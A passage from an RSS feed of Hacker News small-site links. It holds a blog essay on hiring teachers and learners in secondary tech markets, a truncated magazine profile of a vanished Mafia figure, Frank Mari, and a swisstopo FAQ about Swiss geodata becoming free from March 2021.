        </section>

        <section>
            <img src="https://www.unboundapp.com/images/unbound-for-mac-icon-512.png" width="100" height="100" alt="Unbound Photo Browser icon">
            <h2>Unbound for Mac</h2>
            <a href="https://itunes.apple.com/us/app/unbound/id690375005?ls=1&amp;mt=12"><img src="https://www.unboundapp.com/images/badge-mac.svg" width="180" alt="Download on the Mac App Store"></a>
        </section>

        
    </section></div>]]>
            </description>
            <link>https://www.unboundapp.com/blog/mac-app-store/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521679</guid>
            <pubDate>Wed, 23 Dec 2020 20:16:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When hiring in secondary markets, seek out great teachers and avid learners]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521666">thread link</a>) | @zeptonaut22
<br/>
December 23, 2020 | https://www.zeptonaut.com/posts/in-secondary-markets-hire-teachers/ | <a href="https://web.archive.org/web/*/https://www.zeptonaut.com/posts/in-secondary-markets-hire-teachers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <section>

<p>Tobi Lutke is the CEO of Shopify, which is a hugely successful E-Commerce company based out of Ottawa, Canada.</p>

<p>I find him interesting for two reasons:</p>

<ol>
<li>He reasons from first principles about how to effectively build companies</li>
<li>He’s built a wildly successful technology company in a secondary market (i.e. not Silicon Valley)</li>
</ol>

<p>As someone that’s also trying to build a successful technology company in a secondary market (Ann Arbor), I’m definitely interested in what Lutke has to say.</p>

<p>One such piece of advice that he offers could be paraphrased as:</p>

<blockquote>
<p>When hiring in secondary markets, choose employees with the assumption that you’ll work together for at least 10 years.</p>

<p>That means that hiring based on the candidate’s growth potential is much more important than in primary markets.</p>
</blockquote>

<p>This advice resonates with how I see people in Michigan view their jobs: generally, when they choose a job, they pick a job that they could see themselves working at for 5-10 years.</p>

<p>This contrasts sharply with Silicon Valley. If the average tenure at a company is two years, you can sure spend 5 hours each week mentoring Jill on how to better manage her team but gee whiz, by the time that actually starts to pay dividends she’s moved on to the company next door.</p>

<p>I do think that his “hire for growth” advice - while not <em>wrong</em>  - is at least insufficient to be useful. What does it mean to hire for growth? Does this mean not to hire senior engineers?</p>

<p>In this post, I’d like to carry forward Lutke’s first principles reasoning in order to determine how you should hire differently in secondary markets.</p>



<p>I like to think of what a candidate offers looks something like a layered cake: from bottom to top, the layers are:</p>

<ul>
<li>Foundational character traits</li>
<li>Foundational technical skills</li>
<li>Professional technical skills</li>
<li>Professional social skills</li>
</ul>

<p>The lower the layer in the cake, the harder it is to change that aspect of the person.</p>

<p>Starting with the bottom:</p>

<p><strong>Foundational character traits</strong> include how well someone can teach others, whether they can write well, whether they try to avoid the same mistake multiple times, and how eager they are to learn new things.</p>

<p>These traits take years to take shape and are often the direct result of someone’s upbringing and education. There’s a good chance that if you hire someone with a gap in one of these skills, you’re stuck with it.</p>

<p><strong>Foundational technical skills</strong> are the skills that someone needs before they can even really start grappling with the <em>real</em> skills that make them good at their job. For software engineers, you’re probably looking at someone that can program well in at least one or two languages, understands what a unit test is and how to write it, knows the basics of databases and networking, etc.</p>

<p>These skills are <em>certainly</em> teachable (as demonstrated by many-a CS curriculum). However, they’re wide-spanning enough that it likely takes years to learn them in a comprehensive way that ensures good coverage.</p>

<p>For example, when working on a project, it’s hard to justify stopping in the middle to take a few weeks and go learn SQL. If you make a hire without foundational technical skills, you’ll find that you’re often faced with two choices when you encounter one of these gaps:</p>

<ol>
<li>Halt whatever you’re working on and develop a plan to fill that knowledge gap</li>
<li>Do “just enough to get by” but never really fill the knowledge gap</li>
</ol>

<p>The first makes it hard to put this person on any sort of time sensitive project, while the latter never really addresses the problem.</p>

<p>That’s why I think that foundational technical skills are a must-have, even when hiring for junior positions.</p>

<p><strong>Professional technical skills</strong></p>

<p>These are the skills that get “layered on top of” the foundational technical skills in order to really make someone effective at their job.</p>

<p>For software engineers, I consider these skills the ones that basically no CS undergraduate will have learned in school. These are things like how to effectively monitor code running in production, design an API, or scale a service as it gets more usage.</p>

<p>These skills are often learned through a combination of actually facing the problem and having someone else around that’s faced it before and can help you learn how to solve it.</p>

<p>Additionally, the problems themselves are often ones that are hard to replicate in the classroom. For example:</p>

<ul>
<li>The solutions to these problems cost significant money (how to implement monitoring and APM services)</li>
<li>The problems only exist due to the volume of traffic that a service is receiving (how to effectively use a load balancer)</li>
<li>The problems only exist due to many engineers collaborating on a project (how to ensure consistent code styles and distribute knowledge of best practices)</li>
</ul>

<p>Junior engineers cannot be expected to have these skills.</p>

<p>Furthermore, because these skills are a result of facing the problem before and not all engineers specialize in all things, not all <em>senior</em> engineers should be expected to have these skills. However, senior engineers should be expected to have depth in <em>a few</em> of these areas and - if you’re hiring well - at least one of those areas hopefully addresses a pain point that your team currently has.</p>

<p>Hiring this way allows senior engineers to be the mentor necessary to effectively bring junior engineers and other senior engineers “up to their level” in their respective area of expertise.</p>

<p><strong>Professional social skills</strong></p>

<p>These skills are layered on top of even the professional technical skills and are the ones that allow someone to coordinate a group of people to work together and grow as a team.</p>

<p>I don’t have much insight to offer here: I’m still learning.</p>



<blockquote>
<p>In secondary markets, hire for growth potential.</p>
</blockquote>

<p>I’d like to offer a corollary to this:</p>

<blockquote>
<p>In secondary markets, hire people who are both great teachers and avid learners.</p>
</blockquote>



<p>Being an effective teacher requires a high level of empathy with the audience along with communication skills that are very, very hard to teach. That’s why I stuck it in the “foundational character traits” bucket above. It’s very likely that if you hire a bad teacher, they’ll remain a bad teacher.</p>

<p>The problem with this becomes apparent when you see what happens when you hire a bad teacher at each level:</p>

<ul>
<li>If you hire a senior engineer that’s a bad teacher, they’re unable to mentor the rest of the team in their domains of expertise. This means that you get minimal leverage on their skillset</li>
<li>If you hire a junior engineer that’s a bad teacher, you’re investing years of training into someone from whom you’ll ultimately get minimal leverage from their skillset</li>
</ul>

<p>In computer science terms, hiring good teachers yields superlinear returns because you benefit from both the work they do and the increased level of productivity they help others reach.</p>

<p>Hiring bad teachers yields a linear return because you benefit only from the work they do.</p>



<p>Along with teaching, there’s one other foundational trait that’s critical when hiring in secondary markets: the person has to be an avid and effective learner. A strong growth mindset is critical.</p>

<p>If you think of someone’s growth as a straight line, their attitude towards learning and their ability to effectively learn greatly influence the slope of that line. Finding effective learners is much more important when the time that the person will be spending with you is significant. In high-turnover primary markets, the skill change during the minimal time the employee spends with you is likely to be small regardless of their ability to learn, so you should hire them primarily based on their current abilities. This isn’t true when hiring in secondary markets.</p>



<ul>
<li>Carefully choose what foundational character traits you care about and figure out how to identify them in interviews.</li>
<li>In secondary markets, seek out great teachers and avid learners</li>
<li>Choose your foundational technical skills and figure out how to identify them in interviews.</li>
<li>Senior engineers should have depth in multiple areas, at least one of which will broaden the team’s overall expertise.</li>
</ul>

<p>P.S. The startup I work at - <a href="https://channels.org/curtiswiklund">Channels.org</a> - is looking to hire a senior software engineer! You can find out more and apply <a href="https://angel.co/company/channels-org/jobs/1012413-lead-software-engineer">here</a>.</p>
</section>
  </article></div>]]>
            </description>
            <link>https://www.zeptonaut.com/posts/in-secondary-markets-hire-teachers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521666</guid>
            <pubDate>Wed, 23 Dec 2020 20:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Story of T]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25521635">thread link</a>) | @boovic
<br/>
December 23, 2020 | http://www.thestacksreader.com/the-story-of-t/ | <a href="https://web.archive.org/web/*/http://www.thestacksreader.com/the-story-of-t/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
<p>“A street guy like T is a different kind of person. Everything for a guy like that, for, a member, is different. They’re in that private world of their own and that’s all they want to know. They’re in it all their lives. They’ve got fathers and uncles and cousins inside. They’re many inside and, believe me, they love it. They’re like gypsies, all by themselves with their secrets. They love to sit around and make deals with each other. Make their moves. When you and I are in bed, they’re making their moves.</p>
<p>“You should see them go through the papers in the morning, sucking their fingers and turning the page, sucking their fingers and turning the page, and then, when they get to something they like, they say, ‘Questo ca e una Cosa nostra,’ and that means, ‘This is something for us,’ you know what I mean? Believe me, when they go to church, because most of them are so religious they got saints hanging all over the walls of their houses, when they go to church they pray to God, ‘O Jesus, Mary and Joseph, give me the strength to rob again.’</p>
<p>“Even when they get arrested, and for them that’s no disgrace, they’re making their deals. They sit with each other in the cafes and with their lawyers. ‘Can we reach this guy?’ ‘Can we do it this way?’ ‘If we take a plea, can we make a bargain?’ That’s what they love. Always dealing. With the cops, the D.A., everybody. It’s like playing pinochle with prison sentences.</p>
<p>“I remember near the end of the war when T got drafted. In six months he was back on the street with a psycho discharge and 100 per cent disability from the Government. He was no more crazy than I am, but he kept yelling and banging his head on the floor and eating newspapers until they gave up. See what I mean? Always scheming. Not enough to be back on the street, he comes out with $350 a month clear for the rest of his life. I remember when he got out we had some birthday party for him. It was one of the only times I remember that he laughed, but he was still pretty young.”</p>
<hr>
<p>Frank Mari, alias Frankie T, alias Frank Russo, alias T, kissed his wife goodbye the morning of Sept. 18, shoved his forearm into the playful jaws of his white German shepherd, handed a small overnight bag to his bodyguard and drove away from his Searington, L.I., home for what many of his Mafia contemporaries feel was the last time. Within two weeks a story appeared on page 30 of <em>The New York Times</em> that read, in part:</p>
<blockquote><p>Frank Mari, a gunman who survived three years of the Mafia’s “Banana War,” vanished more than two weeks ago and is now believed by Nassau County police to have been murdered, along with Michael Adamo.</p></blockquote>
<p>But what is puzzling the police is whether the double killing—if that is what happened—marks renewal of the underworld war by friends of the exiled Joseph (Joe Bananas) Bonanno, or was the work of some of Mari’s associates jealous of his rapid rise as an underboss to Paul Sciacca, Bonanno’s successor ….</p>
<p>“Until we find the bodies, either dead or alive, we’re not sure of anything,” said a high New York police official. “It could be murder, and it could be that these two fellows had a reason for disappearing.”</p>
<p>Marl’s wife, Jane, and Adamo’s wife, Grace, did not report their husbands’ disappearance to the police immediately.</p>
<p>At 43 years Frank Mari was not one of the city’s most prominent mafiosi. He rarely found his name in the newspaper, and when he did it usually appeared midway down a list of multisyllabic surnames, most of which were either misspelled or followed by phony addresses. Frank Mari had never been arrested at any of the prestigious Apalachin‐style meetings, had never testified before a Congressional committee or had to duck the television crews and newsmen who waited outside police stations and legislative hearings. Joseph Valachi’s naming him a “soldier” in the Mafia family of Joseph Bonanno attracted no public attention and very little interest among the most ambitious prosecutors. Even his criminal record, which dates back to 1945 and includes eight arrests for a variety of charges from felonious assault to conspiracy to violate Federal narcotics laws, has only one conviction. In May of 1968 Frank Mari began to serve a three‐month jail term for illegal possession of a gun.</p>
<hr>
<p>Frank Mari was just one of 4,500 Federally certified Cosa Nostra members, and his life, like the lives of the majority of those pathologically defensive men, was inbred and insular. Mari’s father‐in‐law is a captain in the Bonanno family; his brother‐in‐Iaw is a soldier in the Genovese family, and 17 months before his disappearance he was credited with encouraging the marriage of his niece to the son of Paul Sciacca, then the boss of the entire Bonanno family. Like most mafiosi, Mari did not associate with anyone who was not either a member or related to a member of that exotic sub culture. Outsiders—all outsiders—are considered prey who can be lied to, cheated, frightened, robbed and murdered.</p>
<p>Around strangers Mari was silent, remote, and expressionless. His life was as narrowly prescribed as that of a Supreme Court justice. Reclusive, quiet and even dull, Mari lived with his wife and two daughters in middle‐class suburban community where he was considered a polite, if remote, neighbor. Mari’s son, a 21-year‐old law student, was away at school most of the time. Mari’s hobbies were limited to training his dog and collecting rare coins. His neighbors, who had heard of Mari’s Mafia connections, either refused to believe it or said it made no difference since he was more desirable than some of their other neighbors. Even a New York City patrolman who lived nearby said there was very little about Marl’s home life to criticize.</p>
<p>“He was always a gentleman,” the patrolman said. “Only time I ever saw him was when he was playing with his kids or when he was in the backyard on Saturday morning teaching his dog to be vicious.”</p>
<hr>
<p>Away from his home, Mari’s life appeared just as uneventful. During the day he always ate before or after the lunch and dinner hours to avoid being seated next to strangers, and he never ate in a restaurant where he did not know personally the owners and waiters. Despite the fact that both police and Mafia informers swear that Mari could be a cruel, ruthless killer, equally adept with gun, garrote or knife, he never acted precipitantly. Like millions of other Americans he was treated rudely by retail clerks; restaurants and bars sometimes padded his bills, and he had to wait in line to see first‐run films with his wife on Saturday night.</p>
<p>On occasion he did exercise his power as a member of the Honored Society in personal matters, but not often. Once a very close friend asked him to see what could be done about a narcotics pusher who was selling drugs around a Bronx school. The police, Mari’s friend said, could or would do nothing. Selling narcotics to strangers is business to the mafiosi, except when it threatens their homes. Therefore, when Mari had determined that the pusher was not connected with any Mafia family, or “mobbed up,” he ordered two goons sent to the school, where they mercilessly beat the man. The man fled the neighborhood and never returned.</p>
<p>On another occasion, Mari found out that a rare coin, worth $1,500, which he had intended to buy for his $19,000 collection, had been stolen from a coin dealer. According to several of his friends, Mari was agitated enough by the theft to dispatch some of his men to question fences all around the city. When they discovered who had done the job, Mari had the burglar’s Brooklyn house staked out as though the burglar were being set up for a hit. When the man got home and was confronted by four, tight‐lipped gunmen in two cars, he screamed that they couldn’t possibly want him, that there had to be some mistake. He was even more bewildered when his abductors took him before a Mafia coin collector who gave him $500 for the coin and sent him back to Brooklyn in chauffeured car with two bodyguards.</p>
<p>On still another occasion a local priest asked Mari if he could help the Christmas collection for the children of the poor. A few days later a truckload of toys was delivered to the church along with several racks of new children’s clothing and a cash gift of $2,000. Mari’s only stipulation was that he be acknowledged as the donor.</p>
<hr>
<p>As a Mafia soldier, Frank Mari knew that his telephone was tapped, his house was bugged and that three or four days every month he was the subject of a routine 24‐hour surveillance by either local or Federal agents. These, as well as thousands of other inconveniences, had long ago been incorporated into his life, just as they have become a part of the lives of other mafiosi. He knew that telephones were to be used sparingly and for only the briefest and most cryptic messages. Conversations about the brotherhood or indictable crimes were invariably held out of doors, usually while walking through crowded city streets with bodyguard or “shooter” near by. During such walks Mari employed the old jailhouse technique of using a news paper, handkerchief or even his hand to cover his mouth in an attempt to thwart lip readers.</p>
<p>Mari avoided telephones to such an extent that he would not use even the public phones in the immediate vicinity of his house. Mafiosi insist that the F.B.I. deliberately breaks most of the pay telephones in the vicinity of their homes, then taps the few that are left working. On the days when Mari was under surveillance he followed a common Mafia police practice, worked out for their mutual convenience, whereby his daily itinerary was shown to the lawmen so that if they became accidentally separated in traffic during the day, the police tail could always pick him up at the next stop. On such days, of course, most of Mari’s illegal activities were taken care of by his associates or relatives.</p>
<hr>
<p>Until his disappearance, Frank Mari ruled a million dollar Mafia conglomerate from a chair outside a dingy, storefront social club on Manhattan’s …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.thestacksreader.com/the-story-of-t/">http://www.thestacksreader.com/the-story-of-t/</a></em></p>]]>
            </description>
            <link>http://www.thestacksreader.com/the-story-of-t/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521635</guid>
            <pubDate>Wed, 23 Dec 2020 20:11:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free Basic Swiss Geodata]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25521405">thread link</a>) | @teichmann
<br/>
December 23, 2020 | https://www.swisstopo.admin.ch/en/swisstopo/free-geodata.html | <a href="https://web.archive.org/web/*/https://www.swisstopo.admin.ch/en/swisstopo/free-geodata.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div id="inpagenav_0">
			<h3>What is at issue?</h3>
			<div>


<div>
    
	
	
	

    
    <div>
        
        <p>swisstopo already provides numerous online tools and geodata free of charge. These can be obtained directly from swisstopo or via the opendata.swiss platform.<br>
</p>
<p>In future, all swisstopo's standard digital products, such as digital maps, aerial photographs and landscape models, will be available free of charge as Open Government Data and will be freely usable. These will be made available in such a way that users can acquire them independently from the Internet.<br>
</p>
<p>The Federal Council took a first step on 3 April 2020 with the amendment of the Geoinformation Ordinance. This forms the legal basis for the free distribution of all swisstopo's standard digital products as Open Government Data. The associated annual revenue shortfall of CHF 4 to 5 million was approved by Parliament in the budget debate of December 2020. From 1 March 2021, swisstopo digital standard products will therefore be available online free of charge.<br>
Â&nbsp;</p>

        
    </div>
    
    
</div>



    


</div>


		</div>

		

	

		

		<div id="inpagenav_1">
			<h3>Milestones</h3>
			<div>
	
	
	

<table> 
 <caption>
  Milestones for the implementation of Open Government Data at swisstopo
 </caption>
 <thead>
  <tr>
   <th>Date</th>
   <th>Milestone</th>
  </tr>
 </thead>
 <tbody>
  <tr>
   <td>03/04/2020</td> 
   <td>Federal Council decision to amend the Geoinformation Ordinance.</td> 
  </tr>
  <tr>
   <td>December 2020</td> 
   <td>Budget debate in the Federal Parliament</td> 
  </tr>
  <tr>
   <td>01/03/2021</td> 
   <td>Entry into force of the amendments to the ordinance</td> 
  </tr>
  <tr>
   <td>From 01/03/2021</td> 
   <td>Data can be obtained free of charge on the Internet</td> 
  </tr>
 </tbody>
</table>



    

</div>


		</div>

	

		

		<div id="inpagenav_2">
			<h3>Frequently Asked Questions (FAQ)</h3>
			<div><div id="id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy">

	
	
	
		<h2>Origins and reasons</h2>
	
	


	

    



	
		
		
			
			
				
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_1" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy">What does â€œfree of chargeâ€� mean exactly? Are there any additional processing fees?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_1">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>Free means without costs or fees for the standard digital products. These can be downloaded free of charge from the Internet by users without additional processing.</p>
<p>For geodata:<br>
Free of charge means that no fee is charged for the use of the data. It is also free if the user downloads the data from the Internet him or herself. However, if the data must be prepared and sent by a swisstopo employee, a fee is charged for the preparation of the data. From 1 March 2021 onwards, not all swisstopo geodata will be available for self-download. The number of datasets will be gradually expanded.</p>
<div><p>For geoservices:<br>
swisstopo geodata are integrated into the various geoservices of the Federal Geoinformation Infrastructure. These services can be used free of charge and without registration. For the use of service-based data via the geoservices, a maximum number of requests per time unit is set as a usage limit. Within this limit, the use of the data services is free of charge. The usage limit is to be observed as far as possible ("fair use").<br>
If the specified number of requests per time unit is repeatedly exceeded, swisstopo may conclude a contract with the data user for a higher number of requests. This use is then subject to a charge.</p></div>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_2" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy">  Why will there be 11 months between the positive decision of the Federal Council (3 April 2020) and the amendment to the Geoinformation Ordinance (1 March 2021)?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_2">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>There are three main reasons why the period until entry into force is so long:</p>
<ul>
<li>The amendment of the Geoinformation Ordinance will result in an estimated decline in swisstopo's financial income of CHF 4 to 5 million. This decline requires the approval of Parliament. The decision was made when the 2021 budget was approved in December 2020.</li>
<li>In order to be able to provide geodata free of charge subsequent to a positive decision by Parliament, swisstopo will need to adapt its IT systems. The adaptation will take a certain amount of time so that data can be obtained free of charge from 1 March 2021 at the earliest.</li>
<li>The early announcement of the free delivery of data also has the advantage that today's paying customers can adapt to the new situation and make the necessary preparations.</li>
</ul>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				
			
		
	
</div>
</div>
<div><div id="id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">

	
	
	
		<h2>Data provision</h2>
	
	


	

    



	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_0" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">How and where can the swisstopo data be obtained?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_0">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>Geodata which is exempt from charges will be available from 1 March 2021 via swisstopo.ch. The remaining fee-based products and services (printed publishing products) will be obtained via the existing swisstopo online shop.<br>
</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_1" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">What datasets will swisstopo provide free of charge from 1 March 2021?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_1">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>The use of all swisstopo digital standard products will be free-of-charge from 1 March. The provision of the digital standard products for free independent download will take place in rapid succession from 1 March 2021.</p>
<ul>
<li>SWISSIMAGE</li>
<li>swissALTI3D</li>
<li>swissTLM3D</li>
<li>swissSURFACE3D</li>
<li>swissTLMRegio</li>
<li>Swiss Map Raster</li>
<li>Swiss Map Vector</li>
<li>swissBOUNDARIES3D</li>
<li>swissBUILDINGS3D</li>
<li>swissNAMES3D</li>
<li>swissBATHY3D</li>
<li>DHM25</li>
<li>GeoCover</li>
<li>Digital data set of the winter sports-themed National Maps</li>
<li>Official directories of localities, streets and buildings</li>
</ul>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_5" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">Will the swisstopo app for mobile devices also be free in future?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_5">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>You can already download the Swiss Map Mobile app free of charge and view all maps online. In the free version, any 100 km2 area can be saved for offline use. With the annual subscription of CHF 5, an area of any size can be stored offline on the device for 12 months. From 1 March 2021, this annual fee will no longer apply.</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_8" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">What criteria are used to select the data supplied by swisstopo free of charge? </a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_8">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>The data offered free of charge is that which can be acquired online independently or automatically by users via the Internet and which therefore does not require any effort on the part of swisstopo (= standard digital products). During the first step, the most popular standard digital products are available for online acquisition. In future, however, the service could be expanded to include other federal geodata that are the responsibility of swisstopo.<br>
</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_11" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">Who/which target group should be addressed by the swisstopo datasets?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_11">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>The free, standard digital products are available to everyone as a public service. The aim is to achieve the broadest possible and most versatile application of the available data. However, the target groups primarily addressed are those who work with swisstopo data. This includes private and professional users and the public sector. Â&nbsp;</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_12" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">What is not free of charge?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_12">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>The special preparation of data; special formats; data not (yet) downloadable; commercial products and services; printed products; swipos. Â&nbsp;</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_13" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559">  Why is swipos not free of charge?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_541514559_13">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>The Swiss Positioning Service (swipos) is a value-added service which calculates correction data in real time for the current location of the customer from the measurement data (= geobasis data) of the Automatic GNSS Network Switzerland (AGNES), enabling centimetre-accurate positioning. In addition, swipos also integrates the transformation between the various position and height reference frames. The data made available to customers via this service is specially prepared.</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
</div>
</div>
<div><div id="id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy">

	
	
	
		<h2>Use of data</h2>
	
	


	

    



	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_4" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy">Do I need an OGD license to use the data? And if so, which one?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_4">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>The use of Creative Commons licences, as they are commonly and widely used today, is not compatible with the legal basis (GeoIG, GeoIV). swisstopo geodata is supplied with conditions of use which comply with the legal basis. The conditions of use allow free use for all purposes and oblige the user to indicate the source.</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_6" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy">What happens to my geodata usage agreement?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_6">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
        <p>If you have a standard user contract (Terms of Use for Private Licence, Business Licence, Business Licence Plus, School Licence) for geodata which is now covered by OGD, the new Terms of Use for swisstopo geodata will automatically apply from the introduction of OGD. These allow much more than the existing user contract. If you have a special contract with swisstopo, you will be contacted by swisstopo. Normally the contract is cancelled with the introduction of OGD and you may continue to use the data or services.</p>

        
    </div>
    
    
</div>



    


</div>



					</div>
				</div>
			
		
	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
	
</div>
</div>
<div><div id="id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_1134512352">

	
	
	
		<h2>Finance, personnel, law, politics </h2>
	
	


	

    



	
		
		
			
			
				
			
		
	
		
		
			
			
				
			
		
